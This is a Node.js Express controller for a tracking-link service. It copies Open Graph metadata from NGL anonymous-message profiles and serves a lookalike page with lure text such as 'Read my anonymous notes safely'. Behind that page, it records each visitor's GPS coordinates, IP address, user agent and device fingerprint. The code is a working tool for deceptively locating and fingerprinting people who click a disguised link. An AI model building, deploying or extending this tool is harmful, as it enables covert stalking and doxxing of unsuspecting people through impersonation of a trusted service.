const { v4: uuid4 } = require('uuid');
const { getClientIp, scrapeNGLProfile } = require('../utils/utils.js');
const { IPinfoWrapper } = require('node-ipinfo');
const { TrackerModel: URLTracker } = require('../models/tracker.model.js');
const { VisitLogModel } = require('../models/visitor.model.js');

const ipinfoWrapper = new IPinfoWrapper(process.env.IPINFO_TOKEN_KEY);

const generateTrackingUrl = async (req, res) => {
  const { originalUrl } = req.body;

  try {
    new URL(originalUrl);
  } catch (_) {
    return res.status(400).send('Invalid URL.');
  }

  const urlTrackingId = uuid4().split('-')[0];

  const ogTags = await scrapeNGLProfile(originalUrl);

  const tracker = new URLTracker({
    targetURL: originalUrl,
    trackingId: urlTrackingId,
    ogMetadata: ogTags,
  });

  await tracker.save();

  const trackingURL = `${req.protocol}://${req.get('host')}/api/v1/t/${urlTrackingId}`;

  return res.json({ trackingURL, urlTrackingId });
};

const getRealGeoLocation = async (req, res) => {
  const { trackingId } = req.params;
  const { latitude, longitude, deviceFingerprint } = req.body;

  const tracker = await URLTracker.findOne({ trackingId });
  if (!tracker) return res.status(404).json({ error: 'Tracking ID not found.' });

  const visitLog = new VisitLogModel({
    ip: getClientIp(req),
    userAgent: req.get('User-Agent'),
    referer: req.get('Referer'),
    trackerId: tracker._id,
    method: 'Browser-GPS',
    location: {
      type: 'Point',
      coordinates: [longitude, latitude], // GeoJSON [lon, lat]
    },
    deviceFingerprint: deviceFingerprint || {},
  });

  await visitLog.save();
  tracker.logs.push(visitLog._id);
  await tracker.save();

  return res.status(200).json({ message: 'GPS recorded.' });
};

const getTrackedUrl = async (req, res) => {
  const { trackingId } = req.params;
  const tracker = await URLTracker.findOne({ trackingId }).populate('logs');

  if (!tracker) {
    return res.status(404).json({ message: 'Tracking link not found' });
  }

  // Store tracker ref for later logging
  req.trackerRef = tracker._id;

  const ogData = tracker.ogMetadata || {};

  // Optional improvement:
  // Serve rendered EJS page prompting HTML5 geolocation
  return res.render('geolocation-prompt', {
    trackingId: tracker.trackingId,
    targetUrl: tracker.targetURL,
    ogUrl: `${req.protocol}://${req.get('host')}/t/${trackingId}`,
    ogTitle: ogData.title || 'Anonymous Message',
    ogDescription: ogData.description || 'Read my anonymous notes safely.',
    ogImage: ogData.image,
  });
};

const getVisitLogsDetails = async (req, res) => {
  const { trackingId } = req.params;

  const visitLogsDetails = await VisitLogModel.find({ trackerId: trackingId });

  if (!visitLogsDetails) {
    return res.status(404).json({ message: 'Tracking logs link not found' });
  }

  return res.status(200).json({
    message: 'fetched visit logs',
    trackingLog: visitLogsDetails,
  });
};

const deleteVisitLog = async (req, res) => {
  const { logId } = req.params;

  const visitLog = await VisitLogModel.findById(logId);

  if (!visitLog) {
    return res.status(404).json({ message: 'Logs link not found' });
  }

  await Promise.all([
    URLTracker.updateOne({ _id: visitLog.trackerId }, { $pull: { logs: visitLog._id } }),
    VisitLogModel.findByIdAndDelete(visitLog._id),
  ]);

  return res.status(200).json({
    message: 'log deleted successfully',
  });
};

const deleteAllVisitLogs = async (req, res) => {
  try {
    const { trackerId } = req.params;

    const tracker = await URLTracker.findOne({ trackingId: trackerId });

    if (!tracker) {
      return res.status(404).json({ message: 'URL Tracker not found.' });
    }

    const logIds = tracker.logs;

    // 2. Delete all VisitLog documents that match the collected IDs
    const deleteLogResult = await VisitLogModel.deleteMany({ _id: { $in: logIds } });

    // 3. Update the Tracker document to empty the 'logs' array
    // We use $set here to overwrite the entire 'logs' array with an empty one.
    const updateTrackerResult = await URLTracker.updateOne(
      { _id: tracker._id },
      { $set: { logs: [] } }
    );

    return res.status(200).json({
      message: 'All logs deleted successfully and tracker updated.',
      deletedLogsCount: deleteLogResult.deletedCount,
      trackerModified: updateTrackerResult.modifiedCount > 0,
    });
  } catch (error) {
    console.error('Error deleting visit logs and updating tracker:', error);
    return res.status(500).json({
      message: 'An error occurred while processing the request',
      error: error.message,
    });
  }
};

const deleteTrackerAndAllLogs = async (req, res) => {
  const { trackingId } = req.params;

  // 1. Find the document instance
  const tracker = await URLTracker.findOne({ trackingId: trackingId });

  if (!tracker) {
    return res.status(404).json({ message: 'Tracker not found.' });
  }

  // 2. Call the *document* delete method, which triggers the pre-hook
  await tracker.deleteOne();

  return res.status(200).json({
    message: 'Tracker and all associated logs deleted successfully.',
  });
};

const getAllTrackers = async (req, res) => {
  const trackers = await URLTracker.find().populate('logs');

  return res.status(200).json({
    message: 'trackers fetched',
    trackers,
  });
};

module.exports = {
  generateTrackingUrl,
  getTrackedUrl,
  getRealGeoLocation,
  getVisitLogsDetails,
  getAllTrackers,
  deleteAllVisitLogs,
  deleteVisitLog,
  deleteTrackerAndAllLogs,
};
